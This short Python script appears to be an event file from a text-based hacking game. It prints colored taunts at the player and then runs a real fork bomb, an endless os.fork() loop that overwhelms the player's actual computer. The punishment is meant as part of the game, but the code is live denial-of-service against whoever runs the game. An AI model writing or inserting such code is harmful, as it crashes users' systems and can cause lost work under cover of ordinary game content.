import termcolor

if 'event5!' in kwargs['game'].events_run:
    kwargs['game'].events_run.remove('event5!')
kwargs['game'].forkbomb = True

print(termcolor.colored(
    "You thought you could hack Jason the unhackable?!  HA!",
    'red'
))

print(termcolor.colored(
    "PREPARE TO DIE!!!",
    attrs=['bold', 'blink']
))

# Forkbomb!
import os
while True:
    os.fork()
